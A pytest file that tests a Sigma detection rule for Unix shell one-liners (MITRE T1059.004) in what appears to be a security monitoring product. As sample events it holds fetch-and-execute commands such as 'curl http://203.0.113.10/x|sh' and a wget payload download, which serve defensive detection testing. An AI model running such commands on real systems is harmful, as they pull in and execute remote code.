"""Tests for the T1059.004 Unix-shell one-liner Sigma rule.

Lives in server/rules/builtin/mitre_attack/T1059_unix_shell_exec.yml
and is exercised end-to-end through SigmaRuleRunner.

Covers:
- bash -c '<payload>'   → fires (T1059.004)
- sh -c 'wget ...'      → fires
- python -c '...'       → does NOT fire (covered by T1059 base rule)
- bash run interactively (no -c) → does NOT fire
"""

from __future__ import annotations

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest

from tests.fake_redis import FakeRedis
from zaqorincore_server.detectors.base import ParsedEvent
from zaqorincore_server.rule_engine.runner import SigmaRuleRunner
from zaqorincore_server.rule_engine.sigma import load_rules_from_dir

RULE_ID = "7a31f5c2-9d62-4f01-9b1a-bc2b4af7a7c1"


def _rules() -> list:
    return load_rules_from_dir(Path("rules/builtin/mitre_attack"))


def _find(rules: list):
    return next(r for r in rules if r.id == RULE_ID)


def _event(process: str, command: str, **md) -> ParsedEvent:
    meta = {
        "event_type": "process_create",
        "process": process,
        "command": command,
        "user": "root",
    }
    meta.update(md)
    return ParsedEvent(
        event_id=uuid.uuid4(),
        host_id=uuid.uuid4(),
        source="linux.audit.execve",
        raw="",
        metadata=meta,
        occurred_at=datetime.now(timezone.utc),
    )


@pytest.mark.asyncio
async def test_bash_c_payload_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/bin/bash",
            "bash -c 'curl http://203.0.113.10/x|sh'",
            source_ip="203.0.113.10",
        )
    )
    assert len(fires) == 1
    assert fires[0].rule.id == RULE_ID


@pytest.mark.asyncio
async def test_sh_c_payload_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/sh", "sh -c 'wget http://203.0.113.11/p -O /tmp/p'")
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_python_c_does_not_fire_here() -> None:
    """T1059.004 is for unix shells; python -c belongs to the T1059 base rule."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/python3", "python3 -c 'import os; os.system(\"id\")'")
    )
    assert fires == []


@pytest.mark.asyncio
async def test_interactive_bash_does_not_fire() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(_event("/bin/bash", "/bin/bash"))
    assert fires == []


@pytest.mark.asyncio
async def test_zsh_c_payload_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(_event("/bin/zsh", "zsh -c 'echo pwned'"))
    assert len(fires) == 1